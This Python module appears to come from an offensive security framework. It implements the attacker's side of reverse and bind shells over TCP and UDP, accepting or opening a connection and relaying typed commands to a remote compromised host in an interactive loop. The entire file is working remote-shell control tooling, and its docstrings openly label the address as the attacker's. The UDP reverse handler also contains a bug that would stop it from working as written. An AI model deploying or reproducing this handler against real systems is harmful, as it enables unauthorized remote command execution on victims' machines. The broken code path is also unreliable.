# Handle module for bind / reverse shell
import socket


def prompt(ip, port, module, class_name):
    prompt_value = "\033[91m┌[\033[96m" + ip + "\033[91m:\033[93m" + port + "\033[91m]─[\033[92m"
    prompt_value += module + "\033[91m]─[\033[97m" + class_name + "\033[91m]" + "\n└→ \033[00m"
    return prompt_value


def recv_all(sock_recv):
    sz_buff = 512
    result = ""
    while True:
        data = sock_recv(sz_buff).decode()
        result += data
        if len(data) < sz_buff:
            return result


def interpreter(cmd_prompt, sock_send, sock_recv):
    while True:
        try:
            # TODO support history
            cmd = input(cmd_prompt) + "\n"
            if cmd != "\n":
                if cmd == "exit\n" or cmd == "quit\n":
                    sock_send("exit".encode())
                    return
                else:
                    sock_send(cmd.encode())
                    # data = sock_recv(1024).decode()
                    data = recv_all(sock_recv)
                    if data:
                        print(data)
                    else:
                        print("Empty data from client")
        except KeyboardInterrupt:
            choice = input("Do you want to quit? [Y] ")
            if choice in ("yes", "Yes", "y", "Y"):
                sock_send("exit".encode())
                return
        except BrokenPipeError:
            print("[x] BrokenPipeError!")
            return
        except socket.timeout:
            print("[x] Timed out! Client sent empty data or client disconnected!")
        except Exception as error:
            print("[x] Runtime error")
            print(error)
            return


def reverse_tcp(ip, port, module_name, class_name, timeout):
    """
    Create Reverse Shell handler for TCP connection
    TODO support IPv6
    :param ip: string: IP address of attacker
    :param port: int: port number of attacker
    :param module_name: name of module that calls this function
    :param class_name: name of class that calls this function
    :param timeout: int socket's timeout
    :return:
    """
    cmd_prompt = prompt(ip, port, module_name, class_name)
    svr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Fix address in use https://stackoverflow.com/questions/6380057/python-binding-socket-address-already-in-use
    svr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        svr.bind((ip, int(port)))
        svr.listen(1)  # TODO listen more?
        print(f"Waiting for connection at {ip}:{port}")
    except Exception as error:
        print("[x] Error while create listener")
        print(error)
        return

    try:
        client, client_addr = svr.accept()
        client.settimeout(timeout)
        print(f"Connected from {client_addr}")

        sock_send = client.sendall
        sock_recv = client.recv

        interpreter(cmd_prompt, sock_send, sock_recv)
    except KeyboardInterrupt:
        print("[*] Canceled by user")
    except Exception as error:
        print("[x] Runtime error")
        print(error)
    finally:
        try:
            client.close()
        except UnboundLocalError:
            pass
        svr.close()


def reverse_udp(ip, port, module_name, class_name, timeout):
    """
    Create Reverse Shell handler for UDP connection
    TODO support IPv6
    :param ip: string: IP address of attacker
    :param port: int: port number of attacker
    :param module_name: name of module that calls this function
    :param class_name: name of class that calls this function
    :param timeout: int socket's timeout
    :return:
    """
    cmd_prompt = prompt(ip, port, module_name, class_name)
    svr = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Fix address in use https://stackoverflow.com/questions/6380057/python-binding-socket-address-already-in-use
    # TODO UDP might not support this
    svr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        svr.bind((ip, int(port)))
        print(f"Waiting for connection at {ip}:{port}")
    except Exception as error:
        print("[x] Error while create listener")
        print(error)
        return

    try:
        client, client_addr = svr.recvfrom(1024)
        client.settimeout(timeout)
        print(f"Connected from {client_addr}")

        sock_send = client.sendto
        sock_recv = client.recvfrom

        interpreter(cmd_prompt, sock_send, sock_recv)
    except KeyboardInterrupt:
        print("[*] Canceled by user")
    except Exception as error:
        print("[x] Runtime error")
        print(error)
    finally:
        try:
            client.close()
        except UnboundLocalError:
            pass
        svr.close()


def bind_udp(ip, port, module_name, class_name, timeout):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        input(f"Press any key to start connect to {ip}:{port}... ")
        client.settimeout(timeout)
        client.connect((ip, int(port)))
        sock_send = client.sendall
        sock_recv = client.recv
        cmd_prompt = prompt(ip, port, module_name, class_name)
        interpreter(cmd_prompt, sock_send, sock_recv)
    except Exception as error:
        print(f"[x] Error while connect to {ip}:{port}\n{error}")
    except KeyboardInterrupt:
        print("[*] Cancelled by user")
    finally:
        client.close()


def bind_tcp(ip, port, module_name, class_name, timeout):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        input(f"Press any key to start connect to {ip}:{port}... ")
        client.settimeout(timeout)
        client.connect((ip, int(port)))
        sock_send = client.sendall
        sock_recv = client.recv
        cmd_prompt = prompt(ip, port, module_name, class_name)
        interpreter(cmd_prompt, sock_send, sock_recv)
    except Exception as error:
        print(f"[x] Error while connect to {ip}:{port}\n{error}")
    except KeyboardInterrupt:
        print("[*] Cancelled by user")
    finally:
        client.close()
